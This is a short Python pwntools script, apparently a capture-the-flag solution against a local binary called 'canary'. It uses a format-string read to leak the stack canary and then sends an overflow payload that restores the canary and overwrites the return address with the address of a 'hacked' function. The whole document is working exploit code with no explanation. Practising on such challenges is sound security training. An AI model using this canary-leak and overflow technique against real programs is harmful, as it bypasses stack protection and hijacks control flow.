from pwn import *

context.binary = elf = ELF('./canary')

p = process()

p.sendlineafter("You'll never beat my state of the art stack protector!", b"%23$p")

p.recvline()

canary = int(p.recvline(), 16)
log.success(f"Canary: {hex(canary)}")

offset = 64 # buffer size

payload = flat([
    b'A' * offset,
    canary,
    12 * b'A', # 64 + 4 + 12 = 80
    elf.symbols.hacked
])

p.sendlineafter(b":P", payload)

p.interactive()
